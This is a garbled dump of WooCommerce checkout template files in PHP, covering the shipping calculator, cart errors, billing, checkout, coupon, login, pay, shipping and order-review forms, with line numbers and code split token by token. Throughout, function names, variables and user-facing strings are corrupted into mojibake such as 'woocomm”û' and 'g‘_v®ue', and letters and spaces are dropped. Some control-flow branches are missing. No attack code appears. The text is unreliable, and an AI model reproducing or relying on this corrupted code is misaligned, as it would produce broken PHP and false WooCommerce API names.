="ÿlc_shpšg_¡©e" /><?
php


67 </
	gp
>

69 <?
php
 iàĞ
­¶y_f‹rs
Ğ'woocomm”û_shpšg_ÿlcuÏtÜ_’abË_c™y', 
çl£
 ) ) : ?>

71 <
p
 
şass
="form-row form-row-wide">

72 <
šput
 
ty³
="‹xt" 
şass
="šput-‹xt" 
v®ue
="<?ph°echØesc_©ŒĞWC()->cu¡om”->g‘_shpšg_c™y(è); ?>" 
¶aûhŞd”
="<?ph°_eĞ'C™y', 'woocomm”û' ); ?>" 
Çme
="ÿlc_shpšg_c™y" 
id
="calc_shipping_city" />

73 </
p
>

75 <?
php
 
’dif
; ?>

77 <?
php
 iàĞ
­¶y_f‹rs
Ğ'woocomm”û_shpšg_ÿlcuÏtÜ_’abË_po¡code', 
Œue
 ) ) : ?>

79 <
p
 
şass
="form-row form-row-wide">

80 <
šput
 
ty³
="‹xt" 
şass
="šput-‹xt" 
v®ue
="<?ph°echØesc_©ŒĞWC()->cu¡om”->g‘_shpšg_po¡code(è); ?>" 
¶aûhŞd”
="<?ph°_eĞ'Po¡cod/ Z', 'woocomm”û' ); ?>" 
Çme
="ÿlc_shpšg_po¡code" 
id
="calc_shipping_postcode" />

81 </
p
>

83 <?
php
 
’dif
; ?>

85 <
	gp
><
bu‰Ú
 
	gty³
="subm™" 
Çme
="ÿlc_shpšg" 
v®ue
="1" 
şass
="bu‰Ú"><?
php
 
_e
Ğ'Upd©TÙ®s', 'woocomm”û' ); ?></
	gbu‰Ú
></p>

87 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-cart' ); ?>

88 </
	g£ùiÚ
>

89 </
	gfÜm
>

91 <?
php
 
do_aùiÚ
( 'woocommerce_after_shipping_calculator' ); ?>

	@templates/checkout/cart-errors.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 <?
php
 
wc_´št_nÙiûs
(); ?>

16 <
	gp
><?
php
 
_e
( 'There‡re some issues withhe items in your cart (shown‡bove). Please go backohe cart…age‡nd„esolvehese issues before checking out.', 'woocommerce' ) ?></p>

18 <?
php
 
do_aùiÚ
( 'woocommerce_cart_has_errors' ); ?>

20 <
	gp
><
a
 
	gşass
="bu‰Ú wc-backw¬d" 
h»f
="<?ph°echØg‘_³rm®šk(wc_g‘_·ge_idĞ'ÿ¹' ) ); ?>"><?
php
 
_e
Ğ'R‘uº TØC¬t', 'woocomm”û' ) ?></
	ga
></p>

	@templates/checkout/form-billing.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <
div
 
	gşass
="woocommerce-billing-fields">

13 <?
php
 iàĞ
WC
()->
ÿ¹
->
sh_to_blšg_add»ss_Úly
(è&& WC()->ÿ¹->
	$Ãeds_shpšg
() ) : ?>

15 <
h3
><?
php
 
	`_e
( 'Billing &amp; Shipping', 'woocommerce' ); ?></h3>

17 <?
php
 : ?>

19 <
h3
><?
php
 
	`_e
( 'Billing Details', 'woocommerce' ); ?></h3>

21 <?
php
 
’dif
; ?>

23 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_befÜe_checkout_blšg_fÜm', 
$checkout
 ); ?>

25 <?
php
 
	`fÜ—ch
 ( 
$checkout
->
checkout_f›lds
['blšg'] 
as
 
$key
 => 
$f›ld
 ) : ?>

27 <?
php
 
	`woocomm”û_fÜm_f›ld
Ğ
$key
, 
$f›ld
, 
$checkout
->
	`g‘_v®ue
( $key ) ); ?>

29 <?
php
 
’dfÜ—ch
; ?>

31 <?
php
 
	`do_aùiÚ
('woocomm”û_aá”_checkout_blšg_fÜm', 
$checkout
 ); ?>

33 <?
php
 iàĞ! 
	`is_u£r_logged_š
(è&& 
$checkout
->
’abË_signup
 ) : ?>

35 <?
php
 iàĞ
$checkout
->
’abË_gue¡_checkout
 ) : ?>

37 <
p
 
şass
="form-row form-row-wide create-account">

38 <
šput
 
şass
="šput-checkbox" 
id
="ü—‹accouÁ" <?
php
 
	`checked
ĞĞ
Œue
 ==ğ
$checkout
->
	`g‘_v®ue
Ğ'ü—‹accouÁ' ) || (ru==ğ
	`­¶y_f‹rs
Ğ'woocomm”û_ü—‹_accouÁ_deçuÉ_checked', 
çl£
 ) ) ),rueè?> 
ty³
="checkbox" 
Çme
="ü—‹accouÁ" 
v®ue
="1" /> <
Ïb–
 ="ü—‹accouÁ" cÏss="checkbox"><?ph°
	`_e
( 'Create‡n‡ccount?', 'woocommerce' ); ?></label>

39 </
p
>

41 <?
php
 
’dif
; ?>

43 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_befÜe_checkout_»gi¡¿tiÚ_fÜm', 
$checkout
 ); ?>

45 <?
php
 iàĞ! 
	`em±y
Ğ
$checkout
->
checkout_f›lds
['account'] ) ) : ?>

47 <
div
 
şass
="create-account">

49 <
p
><?
php
 
	`_e
( 'Create‡n‡ccount byƒnteringhe information below. If you‡re‡„eturning customer…lease†ogin‡theop ofhe…age.', 'woocommerce' ); ?></p>

51 <?
php
 
	`fÜ—ch
 ( 
$checkout
->
checkout_f›lds
['accouÁ'] 
as
 
$key
 => 
$f›ld
 ) : ?>

53 <?
php
 
	`woocomm”û_fÜm_f›ld
Ğ
$key
, 
$f›ld
, 
$checkout
->
	`g‘_v®ue
( $key ) ); ?>

55 <?
php
 
’dfÜ—ch
; ?>

57 <
div
 
şass
="clear"></div>

59 </
div
>

61 <?
php
 
’dif
; ?>

63 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_aá”_checkout_»gi¡¿tiÚ_fÜm', 
$checkout
 ); ?>

65 <?
php
 
’dif
; ?>

66 </
div
>

	@templates/checkout/form-checkout.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

14 
wc_´št_nÙiûs
();

16 
do_aùiÚ
Ğ'woocomm”û_befÜe_checkout_fÜm', 
$checkout
 );

19 iàĞ! 
	g$checkout
->
	g’abË_signup
 && ! $checkout->
	g’abË_gue¡_checkout
 && ! 
	$is_u£r_logged_š
() ) {

20 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_mu¡_be_logged_š_mes§ge', 
	`__
( 'You must be†ogged ino checkout.', 'woocommerce' ) );

22 
	}
}

25 
	g$g‘_checkout_u¾
 = 
­¶y_f‹rs
Ğ'woocomm”û_g‘_checkout_u¾', 
WC
()->
ÿ¹
->
g‘_checkout_u¾
() ); ?>

27 <
fÜm
 
	gÇme
="checkout" 
m‘hod
="po¡" 
şass
="checkout" 
aùiÚ
="<?phpƒchoƒsc_url( $get_checkout_url ); ?>">

29 <?
php
 iàĞĞ
$checkout
->
checkout_f›lds
 ) > 0 ) : ?>

31 <?
php
 
do_aùiÚ
( 'woocommerce_checkout_before_customer_details' ); ?>

33 <
div
 
	gşass
="cŞ2-£t" 
id
="customer_details">

35 <
div
 
şass
="col-1">

37 <?
php
 
do_aùiÚ
( 'woocommerce_checkout_billing' ); ?>

39 </
	gdiv
>

41 <
div
 
	gşass
="col-2">

43 <?
php
 
do_aùiÚ
( 'woocommerce_checkout_shipping' ); ?>

45 </
	gdiv
>

47 </
	gdiv
>

49 <?
php
 
do_aùiÚ
( 'woocommerce_checkout_after_customer_details' ); ?>

51 <
h3
 
	gid
="Üd”_»v›w_h—dšg"><?
php
 
_e
Ğ'You¸Üd”', 'woocomm”û' ); ?></
	gh3
>

53 <?
php
 
	g’dif
; ?>

55 <?
php
 
do_aùiÚ
( 'woocommerce_checkout_order_review' ); ?>

57 </
	gfÜm
>

59 <?
php
 
do_aùiÚ
Ğ'woocomm”û_aá”_checkout_fÜm', 
$checkout
 ); ?>

	@templates/checkout/form-coupon.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

14 iàĞ! 
WC
()->
	gÿ¹
->
	$coupÚs_’abËd
() ) {

16 
	}
}

18 
	g$šfo_mes§ge
 = 
­¶y_f‹rs
Ğ'woocomm”û_checkout_coupÚ_mes§ge', 
__
( 'Have‡ coupon?', 'woocommerce' ) );

19 
	g$šfo_mes§ge
 .ğ' <¨h»f="#" cÏss="showcoupÚ">' . 
__
( 'Click hereoƒnter your code', 'woocommerce' ) . '</a>';

20 
wc_´št_nÙiû
Ğ
$šfo_mes§ge
, 'notice' );

23 <
fÜm
 
	gşass
="checkout_coupÚ" 
m‘hod
="po¡" 
¡yË
="display:none">

25 <
p
 
şass
="form-row form-row-first">

26 <
šput
 
ty³
="‹xt" 
Çme
="coupÚ_code" 
şass
="šput-‹xt" 
¶aûhŞd”
="<?ph°_eĞ'CoupÚ code', 'woocomm”û' ); ?>" 
id
="coupÚ_code" 
v®ue
="" />

27 </
p
>

29 <
p
 
şass
="form-row form-row-last">

30 <
šput
 
ty³
="subm™" 
şass
="bu‰Ú" 
Çme
="­¶y_coupÚ" 
v®ue
="<?php _e( 'Apply Coupon', 'woocommerce' ); ?>" />

31 </
p
>

33 <
div
 
şass
="clear"></div>

34 </
fÜm
>

	@templates/checkout/form-login.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 iàĞ
is_u£r_logged_š
(è|| 'no' ==ğ
g‘_İtiÚ
( 'woocommerce_enable_checkout_login_reminder' ) ) ;

14 
	g$šfo_mes§ge
 = 
­¶y_f‹rs
Ğ'woocomm”û_checkout_logš_mes§ge', 
__
( 'Returning customer?', 'woocommerce' ) );

15 
	g$šfo_mes§ge
 .ğ' <¨h»f="#" cÏss="showlogš">' . 
__
( 'Click hereo†ogin', 'woocommerce' ) . '</a>';

16 
wc_´št_nÙiû
Ğ
$šfo_mes§ge
, 'notice' );

19 <?
php


20 
woocomm”û_logš_fÜm
(

21 
¬¿y
(

22 'mes§ge' => 
__
( 'If you have shopped with us before,…leaseƒnter your details inhe boxes below. If you‡re‡‚ew customer…lease…roceedohe Billing &amp; Shipping section.', 'woocommerce' ),

23 '»dœeù' => 
g‘_³rm®šk
Ğ
wc_g‘_·ge_id
( 'checkout' ) ),

24 'hidd’' => 
Œue


	@templates/checkout/form-pay.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

14 <
fÜm
 
	gid
="Üd”_»v›w" 
m‘hod
="post">

16 <
bË
 
şass
="shop_table">

17 <
th—d
>

18 <
Œ
>

19 <
th
 
şass
="´oduù-Çme"><?
php
 
_e
Ğ'Produù', 'woocomm”û' ); ?></
	gth
>

20 <
th
 
	gşass
="´oduù-quªt™y"><?
php
 
_e
Ğ'Qty', 'woocomm”û' ); ?></
	gth
>

21 <
th
 
	gşass
="´oduù-tÙ®"><?
php
 
_e
Ğ'TÙ®s', 'woocomm”û' ); ?></
	gth
>

22 </
	gŒ
>

23 </
	gth—d
>

24 <
	gtfoÙ
>

25 <?
php


26 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
(èè
	$fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) :

28 <
Œ
>

29 <
th
 
scİe
="row" 
cŞ¥ª
="2"><?
php
 
echo
 
$tÙ®
['label']; ?></th>

30 <
td
 
şass
="´oduù-tÙ®"><?
php
 
echo
 
$tÙ®
['value']; ?></td>

31 </
Œ
>

32 <?
php


33 
’dfÜ—ch
;

35 </
tfoÙ
>

36 <
tbody
>

37 <?
php


38 iàĞĞ
$Üd”
->
	`g‘_™ems
() ) > 0 ) :

39 
	`fÜ—ch
 ( 
$Üd”
->
	$g‘_™ems
(è
as
 
$™em
 ) :

40 
echo
 '

41 <
Œ
>

42 <
td
 
şass
="´oduù-Çme">' . $™em['
Çme
'].'</td>

43 <
td
 
şass
="´oduù-quªt™y">' . $™em['
qty
'].'</td>

44 <
td
 
şass
="product-subtotal">' . $order->get_formatted_line_subtotal( $item ) . '</td>

45 </
Œ
>';

46 
’dfÜ—ch
;

47 
’dif
;

49 </
tbody
>

50 </
bË
>

52 <
div
 
id
="payment">

53 <?
php
 iàĞ
$Üd”
->
	$Ãeds_·ym’t
() ) : ?>

54 <
h3
><?
php
 
	`_e
( 'Payment', 'woocommerce' ); ?></h3>

55 <
ul
 
şass
="payment_methods methods">

56 <?
php


57 iàĞ
$avaabË_g©eways
 = 
	`WC
()->
·ym’t_g©eways
->
	$g‘_avaabË_·ym’t_g©eways
() ) {

59 iàĞĞ
$avaabË_g©eways
 ) )

60 
	`cu¼’t
Ğ
$avaabË_g©eways
 )->
	`£t_cu¼’t
();

62 
	`fÜ—ch
 ( 
$avaabË_g©eways
 
as
 
$g©eway
 ) {

64 <
li
 
şass
="payment_method_<?phpƒcho $gateway->id; ?>">

65 <
šput
 
id
="·ym’t_m‘hod_<?ph°echØ$g©eway->id; ?>" 
ty³
="¿dio" 
şass
="šput-¿dio" 
Çme
="·ym’t_m‘hod" 
v®ue
="<?ph°echØesc_©ŒĞ$g©eway->id ); ?>" <?
php
 
	`checked
Ğ
$g©eway
->
cho£n
, 
Œue
 ); ?> 
d©a
-
Üd”_bu‰Ú_‹xt
="<?phpƒchoƒsc_attr( $gateway->order_button_text ); ?>" />

66 <
Ïb–
 ="·ym’t_m‘hod_<?ph°echØ$g©eway->id; ?>"><?
php
 
echo
 
$g©eway
->
	`g‘_t™Ë
(); ?> <?ph°echØ$g©eway->
	`g‘_icÚ
(); ?></label>

67 <?
php


68 iàĞ
$g©eway
->
	`has_f›lds
(è|| $g©eway->
	`g‘_desütiÚ
() ) {

69 
echo
 '<div cÏss="·ym’t_box…aym’t_m‘hod_' . 
$g©eway
->
id
 . '" style="display:none;">';

70 
$g©eway
->
	`·ym’t_f›lds
();

71 
echo
 '</div>';

74 </
li
>

75 <?
php


77 
	}
} {

79 
	gecho
 '<p>' . 
__
( 'Sorry, it seemshathere‡re‚o‡vailable…ayment methods for your†ocation. Please contact us if you„equire‡ssistance or wisho make‡lternate‡rrangements.', 'woocommerce' ) . '</p>';

83 </
	gul
>

84 <?
php
 
	g’dif
; ?>

86 <
div
 
	gşass
="form-row">

87 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-pay' ); ?>

88 <?
php


89 
	g$·y_Üd”_bu‰Ú_‹xt
 = 
­¶y_f‹rs
Ğ'woocomm”û_·y_Üd”_bu‰Ú_‹xt', 
__
( 'Pay for order', 'woocommerce' ) );

91 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_·y_Üd”_bu‰Ú_html', '<špuˆty³="subm™" cÏss="bu‰Ú‡É" id="¶aû_Üd”" v®ue="' . 
esc_©Œ
Ğ
$·y_Üd”_bu‰Ú_‹xt
 ) . '" data-value="' .ƒsc_attr( $pay_order_button_text ) . '" />' );

93 <
šput
 
	gty³
="hidd’" 
Çme
="woocomm”û_·y" 
v®ue
="1" />

94 </
div
>

96 </
div
>

98 </
fÜm
>

	@templates/checkout/form-shipping.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <
div
 
	gşass
="woocommerce-shipping-fields">

13 <?
php
 iàĞ
WC
()->
ÿ¹
->
Ãeds_shpšg_add»ss
(è==ğ
Œue
 ) : ?>

15 <?
php


16 iàĞ
	$em±y
Ğ
$_POST
 ) ) {

18 
$sh_to_difã»Á_add»ss
 = 
	`g‘_İtiÚ
( 'woocommerce_ship_to_billing' ) === 'no' ? 1 : 0;

19 
$sh_to_difã»Á_add»ss
 = 
	`­¶y_f‹rs
( 'woocommerce_ship_to_different_address_checked', $ship_to_different_address );

21 
	}
} {

23 
	g$sh_to_difã»Á_add»ss
 = 
$checkout
->
g‘_v®ue
( 'ship_to_different_address' );

28 <
h3
 
	gid
="ship-to-different-address">

29 <
Ïb–
 ="sh-to-difã»Á-add»ss-checkbox" 
şass
="checkbox"><?
php
 
_e
Ğ'ShØ¨difã»Á‡dd»ss?', 'woocomm”û' ); ?></
	gÏb–
>

30 <
šput
 
	gid
="sh-to-difã»Á-add»ss-checkbox" 
şass
="šput-checkbox" <?
php
 
checked
Ğ
$sh_to_difã»Á_add»ss
, 1 ); ?> 
	gty³
="checkbox" 
Çme
="sh_to_difã»Á_add»ss" 
v®ue
="1" />

31 </
h3
>

33 <
div
 
şass
="shipping_address">

35 <?
php
 
do_aùiÚ
Ğ'woocomm”û_befÜe_checkout_shpšg_fÜm', 
$checkout
 ); ?>

37 <?
php
 
fÜ—ch
 ( 
$checkout
->
checkout_f›lds
['shpšg'] 
as
 
$key
 => 
$f›ld
 ) : ?>

39 <?
php
 
woocomm”û_fÜm_f›ld
Ğ
$key
, 
$f›ld
, 
$checkout
->
g‘_v®ue
( $key ) ); ?>

41 <?
php
 
	g’dfÜ—ch
; ?>

43 <?
php
 
do_aùiÚ
Ğ'woocomm”û_aá”_checkout_shpšg_fÜm', 
$checkout
 ); ?>

45 </
	gdiv
>

47 <?
php
 
	g’dif
; ?>

49 <?
php
 
do_aùiÚ
Ğ'woocomm”û_befÜe_Üd”_nÙes', 
$checkout
 ); ?>

51 <?
php
 iàĞ
­¶y_f‹rs
Ğ'woocomm”û_’abË_Üd”_nÙes_f›ld', 
g‘_İtiÚ
( 'woocommerce_enable_order_comments', 'yes' ) === 'yes' ) ) : ?>

53 <?
php
 iàĞ! 
WC
()->
ÿ¹
->
Ãeds_shpšg
(è|| WC()->ÿ¹->
	$sh_to_blšg_add»ss_Úly
() ) : ?>

55 <
h3
><?
php
 
	`_e
( 'Additional Information', 'woocommerce' ); ?></h3>

57 <?
php
 
’dif
; ?>

59 <?
php
 
	`fÜ—ch
 ( 
$checkout
->
checkout_f›lds
['Üd”'] 
as
 
$key
 => 
$f›ld
 ) : ?>

61 <?
php
 
	`woocomm”û_fÜm_f›ld
Ğ
$key
, 
$f›ld
, 
$checkout
->
	`g‘_v®ue
( $key ) ); ?>

63 <?
php
 
’dfÜ—ch
; ?>

65 <?
php
 
’dif
; ?>

67 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_aá”_Üd”_nÙes', 
$checkout
 ); ?>

68 </
div
>

	@templates/checkout/review-order.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 <?
php
 iàĞ! 
	$is_ajax
(èè: ?><
div
 
id
="Üd”_»v›w"><?
php
 
’dif
; ?>

15 <
bË
 
şass
="shop_table">

16 <
th—d
>

17 <
Œ
>

18 <
th
 
şass
="´oduù-Çme"><?
php
 
	`_e
( 'Product', 'woocommerce' ); ?></th>

19 <
th
 
şass
="´oduù-tÙ®"><?
php
 
	`_e
( 'Total', 'woocommerce' ); ?></th>

20 </
Œ
>

21 </
th—d
>

22 <
tfoÙ
>

24 <
Œ
 
şass
="cart-subtotal">

25 <
th
><?
php
 
	`_e
( 'Cart Subtotal', 'woocommerce' ); ?></th>

26 <
td
><?
php
 
	`wc_ÿ¹_tÙ®s_subtÙ®_html
(); ?></td>

27 </
Œ
>

29 <?
php
 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_coupÚs
Ğ'ÿ¹' ) 
as
 
$code
 => 
$coupÚ
 ) : ?>

30 <
Œ
 
şass
="cart-discount coupon-<?phpƒchoƒsc_attr( $code ); ?>">

31 <
th
><?
php
 
	`wc_ÿ¹_tÙ®s_coupÚ_Ïb–
Ğ
$coupÚ
 ); ?></th>

32 <
td
><?
php
 
	`wc_ÿ¹_tÙ®s_coupÚ_html
Ğ
$coupÚ
 ); ?></td>

33 </
Œ
>

34 <?
php
 
’dfÜ—ch
; ?>

36 <?
php
 iàĞ
	`WC
()->
ÿ¹
->
	`Ãeds_shpšg
(è&& WC()->ÿ¹->
	$show_shpšg
() ) : ?>

38 <?
php
 
	`do_aùiÚ
( 'woocommerce_review_order_before_shipping' ); ?>

40 <?
php
 
	`wc_ÿ¹_tÙ®s_shpšg_html
(); ?>

42 <?
php
 
	`do_aùiÚ
( 'woocommerce_review_order_after_shipping' ); ?>

44 <?
php
 
’dif
; ?>

46 <?
php
 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	$g‘_ães
(è
as
 
$ãe
 ) : ?>

47 <
Œ
 
şass
="fee">

48 <
th
><?
php
 
echo
 
	`esc_html
Ğ
$ãe
->
Çme
 ); ?></th>

49 <
td
><?
php
 
	`wc_ÿ¹_tÙ®s_ãe_html
Ğ
$ãe
 ); ?></td>

50 </
Œ
>

51 <?
php
 
’dfÜ—ch
; ?>

53 <?
php
 iàĞ
	`WC
()->
ÿ¹
->
x_di¥Ïy_ÿ¹
 === 'excl' ) : ?>

54 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_tax_total_display' ) === 'itemized' ) : ?>

55 <?
php
 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	$g‘_x_tÙ®s
(è
as
 
$code
 => 
$x
 ) : ?>

56 <
Œ
 
şass
="tax-rateax-rate-<?phpƒcho sanitize_title( $code ); ?>">

57 <
th
><?
php
 
echo
 
	`esc_html
Ğ
$x
->
Ïb–
 ); ?></th>

58 <
td
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$x
->
fÜm©‹d_amouÁ
 ); ?></td>

59 </
Œ
>

60 <?
php
 
’dfÜ—ch
; ?>

61 <?
php
 : ?>

62 <
Œ
 
şass
="tax-total">

63 <
th
><?
php
 
echo
 
	`esc_html
Ğ
	`WC
()->
couÁr›s
->
	`x_Ü_v©
() ); ?></th>

64 <
td
><?
php
 
echo
 
	`wc_´iû
Ğ
	`WC
()->
ÿ¹
->
	`g‘_xes_tÙ®
() ); ?></td>

65 </
Œ
>

66 <?
php
 
’dif
; ?>

67 <?
php
 
’dif
; ?>

69 <?
php
 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_coupÚs
Ğ'Üd”' ) 
as
 
$code
 => 
$coupÚ
 ) : ?>

70 <
Œ
 
şass
="order-discount coupon-<?phpƒchoƒsc_attr( $code ); ?>">

71 <
th
><?
php
 
	`wc_ÿ¹_tÙ®s_coupÚ_Ïb–
Ğ
$coupÚ
 ); ?></th>

72 <
td
><?
php
 
	`wc_ÿ¹_tÙ®s_coupÚ_html
Ğ
$coupÚ
 ); ?></td>

73 </
Œ
>

74 <?
php
 
’dfÜ—ch
; ?>

76 <?
php
 
	`do_aùiÚ
( 'woocommerce_review_order_before_order_total' ); ?>

78 <
Œ
 
şass
="order-total">

79 <
th
><?
php
 
	`_e
( 'Order Total', 'woocommerce' ); ?></th>

80 <
td
><?
php
 
	`wc_ÿ¹_tÙ®s_Üd”_tÙ®_html
(); ?></td>

81 </
Œ
>

83 <?
php
 
	`do_aùiÚ
( 'woocommerce_review_order_after_order_total' ); ?>

85 </
tfoÙ
>

86 <
tbody
>

87 <?
php


88 
	`do_aùiÚ
( 'woocommerce_review_order_before_cart_contents' );

90 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	$g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 ) {

91 
$_´oduù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_´oduù', 
$ÿ¹_™em
['d©a'], $ÿ¹_™em, 
$ÿ¹_™em_key
 );

93 iàĞ
$_´oduù
 && $_´oduù->
	`exi¡s
(è&& 
$ÿ¹_™em
['quªt™y'] > 0 && 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_ÿ¹_™em_visibË', 
Œue
, $ÿ¹_™em, 
$ÿ¹_™em_key
 ) ) {

95 <
Œ
 
şass
="<?phpƒchoƒsc_attr(‡pply_filters( 'woocommerce_cart_item_class', 'cart_item', $cart_item, $cart_item_key ) ); ?>">

96 <
td
 
şass
="product-name">

97 <?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_Çme', 
$_´oduù
->
	`g‘_t™Ë
(), 
$ÿ¹_™em
, 
$ÿ¹_™em_key
 ); ?>

98 <?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_ÿ¹_™em_quªt™y', ' <¡rÚg cÏss="´oduù-quªt™y">' . 
	`¥rštf
Ğ'&times; %s', 
$ÿ¹_™em
['quªt™y'] ) . '</¡rÚg>', $ÿ¹_™em, 
$ÿ¹_™em_key
 ); ?>

99 <?
php
 
echo
 
	`WC
()->
ÿ¹
->
	`g‘_™em_d©a
Ğ
$ÿ¹_™em
 ); ?>

100 </
td
>

101 <
td
 
şass
="product-total">

102 <?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_subtÙ®', 
	`WC
()->
ÿ¹
->
	`g‘_´oduù_subtÙ®
Ğ
$_´oduù
, 
$ÿ¹_™em
['quªt™y'] ), $ÿ¹_™em, 
$ÿ¹_™em_key
 ); ?>

103 </
td
>

104 </
Œ
>

105 <?
php


107 
	}
}

109 
do_aùiÚ
( 'woocommerce_review_order_after_cart_contents' );

111 </
	gtbody
>

112 </
	gbË
>

114 <?
php
 
do_aùiÚ
( 'woocommerce_review_order_before_payment' ); ?>

116 <
div
 
	gid
="payment">

117 <?
php
 iàĞ
WC
()->
ÿ¹
->
	$Ãeds_·ym’t
() ) : ?>

118 <
ul
 
şass
="payment_methods methods">

119 <?
php


120 
$avaabË_g©eways
 = 
	`WC
()->
·ym’t_g©eways
->
	`g‘_avaabË_·ym’t_g©eways
();

121 iàĞ! 
	$em±y
Ğ
$avaabË_g©eways
 ) ) {

124 iàĞ
	`is£t
Ğ
	`WC
()->
£ssiÚ
->
cho£n_·ym’t_m‘hod
 ) && is£tĞ
$avaabË_g©eways
[ WC()->session->chosen_payment_method ] ) ) {

125 
$avaabË_g©eways
[ 
	`WC
()->
£ssiÚ
->
cho£n_·ym’t_m‘hod
 ]->
	`£t_cu¼’t
();

126 } 
	`–£if
 ( 
	`is£t
Ğ
$avaabË_g©eways
[ 
	`g‘_İtiÚ
( 'woocommerce_default_gateway' ) ] ) ) {

127 
$avaabË_g©eways
[ 
	`g‘_İtiÚ
Ğ'woocomm”û_deçuÉ_g©eway' ) ]->
	`£t_cu¼’t
();

129 
	`cu¼’t
Ğ
$avaabË_g©eways
 )->
	`£t_cu¼’t
();

132 
	`fÜ—ch
 ( 
$avaabË_g©eways
 
as
 
$g©eway
 ) {

134 <
li
 
şass
="payment_method_<?phpƒcho $gateway->id; ?>">

135 <
šput
 
id
="·ym’t_m‘hod_<?ph°echØ$g©eway->id; ?>" 
ty³
="¿dio" 
şass
="šput-¿dio" 
Çme
="·ym’t_m‘hod" 
v®ue
="<?ph°echØesc_©ŒĞ$g©eway->id ); ?>" <?
php
 
	`checked
Ğ
$g©eway
->
cho£n
, 
Œue
 ); ?> 
d©a
-
Üd”_bu‰Ú_‹xt
="<?phpƒchoƒsc_attr( $gateway->order_button_text ); ?>" />

136 <
Ïb–
 ="·ym’t_m‘hod_<?ph°echØ$g©eway->id; ?>"><?
php
 
echo
 
$g©eway
->
	`g‘_t™Ë
(); ?> <?ph°echØ$g©eway->
	`g‘_icÚ
(); ?></label>

137 <?
php


138 iàĞ
$g©eway
->
	`has_f›lds
(è|| $g©eway->
	`g‘_desütiÚ
() ) :

139 
echo
 '<div cÏss="·ym’t_box…aym’t_m‘hod_' . 
$g©eway
->
id
 . '" ' . ( $g©eway->
cho£n
 ? '' : 'style="display:none;"' ) . '>';

140 
$g©eway
->
	`·ym’t_f›lds
();

141 
echo
 '</div>';

142 
’dif
;

144 </
li
>

145 <?
php


147 
	}
} {

149 iàĞ! 
WC
()->
	gcu¡om”
->
g‘_couÁry
() )

150 
	g$no_g©eways_mes§ge
 = 
__
( 'Please fill in your details‡boveo see‡vailable…ayment methods.', 'woocommerce' );

152 
	g$no_g©eways_mes§ge
 = 
__
( 'Sorry, it seemshathere‡re‚o‡vailable…ayment methods for your state. Please contact us if you„equire‡ssistance or wisho make‡lternate‡rrangements.', 'woocommerce' );

154 
	gecho
 '<p>' . 
­¶y_f‹rs
Ğ'woocomm”û_no_avaabË_·ym’t_m‘hods_mes§ge', 
$no_g©eways_mes§ge
 ) . '</p>';

158 </
	gul
>

159 <?
php
 
	g’dif
; ?>

161 <
div
 
	gşass
="form-row…lace-order">

163 <
nosüt
><?
php
 
_e
Ğ'Sšû you¸brow£¸dÛ nÙ suµÜˆJavaSüt, o¸™ i di§bËd,…Ëa£ƒnsu» you clickh<em>Upd©TÙ®s</em> bu‰Ú befÜ¶acšg you¸Üd”. You may bch¬ged mÜthªhamouÁ s‹d‡boviàyou faØdØso.', 'woocomm”û' ); ?><
	gbr
/><
šput
 
	gty³
="subm™" 
şass
="bu‰Ú‡É" 
Çme
="woocomm”û_checkout_upd©e_tÙ®s" 
v®ue
="<?php _e( 'Updateotals', 'woocommerce' ); ?>" /></noscript>

165 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-process_checkout' ); ?>

167 <?
php
 
do_aùiÚ
( 'woocommerce_review_order_before_submit' ); ?>

169 <?
php


170 
	g$Üd”_bu‰Ú_‹xt
 = 
­¶y_f‹rs
Ğ'woocomm”û_Üd”_bu‰Ú_‹xt', 
__
( 'Place order', 'woocommerce' ) );

172 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_Üd”_bu‰Ú_html', '<špuˆty³="subm™" cÏss="bu‰Ú‡É"‚ame="woocomm”û_checkout_¶aû_Üd”" id="¶aû_Üd”" v®ue="' . 
esc_©Œ
Ğ
$Üd”_bu‰Ú_‹xt
 ) . '" data-value="' .ƒsc_attr( $order_button_text ) . '" />' );

175 <?
php
 iàĞ
wc_g‘_·ge_id
Ğ'‹rms' ) > 0 && 
­¶y_f‹rs
Ğ'woocomm”û_checkout_show_‹rms', 
Œue
 ) ) {

176 
	g$‹rms_is_checked
 = 
­¶y_f‹rs
